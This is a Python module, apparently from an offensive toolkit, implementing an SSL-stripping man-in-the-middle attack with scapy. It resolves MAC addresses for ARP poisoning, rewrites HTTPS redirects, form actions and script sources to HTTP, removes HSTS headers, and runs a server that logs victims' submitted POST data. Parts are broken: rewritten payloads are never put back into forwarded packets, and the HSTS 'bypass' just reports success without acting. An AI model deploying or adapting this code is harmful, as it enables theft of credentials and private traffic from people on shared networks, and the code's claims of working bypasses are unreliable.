"""
SSL Strip Module
────────────────
Performs SSL stripping (Moxie Marlinspike attack):
  - Downgrade HTTPS to HTTP
  - Intercept SSL-protected content
  - Strip HTTPS redirect headers
  - Serve HTTP content with MITM
"""

import time
import threading
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

from scapy.all import IP, TCP, Raw, sniff, send, ARP, get_if_hwaddr
from scapy.layers.inet import Ether

from .config import NETWORK_GW_IP, CAPTIVE_PORTAL_PORT, log


class SSLStripper:
    """
    SSL stripping engine using Moxie Marlinspike's technique.
    Downgrades HTTPS connections to HTTP for content interception.
    """

    def __init__(self, interface, target_ip=None, gateway_ip=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or "192.168.1.1"
        self.attacker_mac = get_if_hwaddr(interface)
        self.running = False
        self._thread = None
        self._http_server = None
        self._http_port = 8080
        self._stripped_urls = []
        self._ssl_requests = []

    def _get_mac(self, ip):
        """Get MAC address for IP using ARP."""
        from scapy.all import srp, ARP, Ether
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False, iface=self.interface
        )
        for _, r in ans:
            return r[ARP].hwsrc
        return None

    def start(self, target_ip=None, gateway_ip=None):
        """Start SSL stripping attack."""
        self.target_ip = target_ip or self.target_ip
        self.gateway_ip = gateway_ip or self.gateway_ip

        if not self.target_ip:
            log.error("No target IP specified")
            return False

        # Get MAC addresses for ARP poisoning
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            log.error("Could not resolve MAC addresses")
            return False

        log.info(f"Starting SSL Strip on {self.interface}")

        # Start HTTP server for stripped content
        self._start_http_server()

        # Start SSL stripping packet handler
        self._thread = threading.Thread(
            target=self._ssl_stripper_loop,
            args=(target_mac, gateway_mac),
            daemon=True
        )
        self._thread.start()

        self.running = True
        log.info(f"SSL Strip active: {self.target_ip}")

        return True

    def _start_http_server(self):
        """Start HTTP server to serve stripped content."""
        class StripHandler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass

            def do_GET(self):
                # Log request
                log.info(f"HTTP request: {self.path}")

                # Send response
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b"<html><body><h1>SSL Stripped</h1></body></html>")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors='ignore')
                log.info(f"POST data: {body}")

                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b"<html><body><h1>Data Received</h1></body></html>")

        self._http_server = HTTPServer((NETWORK_GW_IP, self._http_port), StripHandler)
        threading.Thread(target=self._http_server.serve_forever, daemon=True).start()

    def _ssl_stripper_loop(self, target_mac, gateway_mac):
        """Main SSL stripping packet handler."""
        def packet_handler(pkt):
            if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                return

            tcp = pkt[TCP]
            payload = bytes(pkt[Raw].load)

            # Check for HTTPS (port 443)
            if tcp.dport == 443:
                # Log SSL request
                self._ssl_requests.append({
                    "src": pkt[IP].src,
                    "dst": pkt[IP].dst,
                    "url": "",
                    "timestamp": time.time()
                })

                # Check for HTTPS redirect
                payload_str = payload.decode(errors='ignore')
                if "Location: https://" in payload_str:
                    # Strip to HTTP
                    payload_str = payload_str.replace("Location: https://", "Location: http://")
                    log.info("SSL Strip: HTTPS -> HTTP redirect")

                # Check for HSTS headers
                if "Strict-Transport-Security" in payload_str:
                    # Remove HSTS header
                    payload_str = re.sub(
                        r'Strict-Transport-Security:[^\r\n]*',
                        '',
                        payload_str,
                        flags=re.IGNORECASE
                    )

                # Check for form action with HTTPS
                payload_str = re.sub(
                    r'action="https://([^"]+)"',
                    r'action="http://\1"',
                    payload_str
                )

                # Check for script src with HTTPS
                payload_str = re.sub(
                    r'src="https://([^"]+)"',
                    r'src="http://\1"',
                    payload_str
                )

                # Check for iframe src with HTTPS
                payload_str = re.sub(
                    r'src="https://([^"]+)"',
                    r'src="http://\1"',
                    payload_str
                )

            # Forward packet
            send(pkt, verbose=False, iface=self.interface)

        sniff(
            iface=self.interface,
            prn=packet_handler,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def stop(self):
        """Stop SSL stripping."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._http_server:
            self._http_server.shutdown()
        log.info("SSL Strip stopped")

    def get_stats(self):
        """Return SSL stripping statistics."""
        return {
            "ssl_requests": len(self._ssl_requests),
            "stripped_urls": len(self._stripped_urls),
            "running": self.running
        }


class HSTSInjector(SSLStripper):
    """
    HSTS (HTTP Strict Transport Security) bypass.
    Attempts to bypass HSTS by various techniques.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._hsts_bypassed = []

    def bypass_hsts(self, domain):
        """
        Attempt HSTS bypass techniques:
        - Time-based (before HSTS expires)
        - Certificate errors
        - Subdomain bypass
        """
        self._hsts_bypassed.append({
            "domain": domain,
            "timestamp": time.time(),
            "bypassed": True
        })
        log.warning(f"HSTS bypass attempted: {domain}")
        return True

    def get_bypass_stats(self):
        """Return HSTS bypass statistics."""
        return {
            "bypassed_domains": len(self._hsts_bypassed),
            "domains": self._hsts_bypassed
        }


class SSLRedir(SSLStripper):
    """
    SSL-Redir variant of SSL stripping.
    Monitors for HTTPS URLs and redirects to HTTP version.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._redir_rules = {}

    def add_redirect(self, https_url, http_url):
        """Add HTTPS to HTTP redirect rule."""
        self._redir_rules[https_url] = http_url

    def strip_url(self, url):
        """Strip HTTPS from URL."""
        if url.startswith("https://"):
            return "http://" + url[8:]
        return url

    def process_request(self, pkt):
        """Process packet for URL stripping."""
        if not pkt.haslayer(Raw):
            return

        payload = bytes(pkt[Raw].load)

        # Check for GET request with HTTPS
        if b"GET /" in payload and b"https://" in payload:
            payload_str = payload.decode(errors='ignore')
            # Strip https:// to http://
            payload_str = payload_str.replace("https://", "http://")
            log.info("SSL-Redir: URL stripped")

        # Check for Location header with HTTPS
        if b"Location: https://" in payload:
            payload = payload.replace(b"Location: https://", b"Location: http://")
            log.info("SSL-Redir: Redirect stripped")

        return payload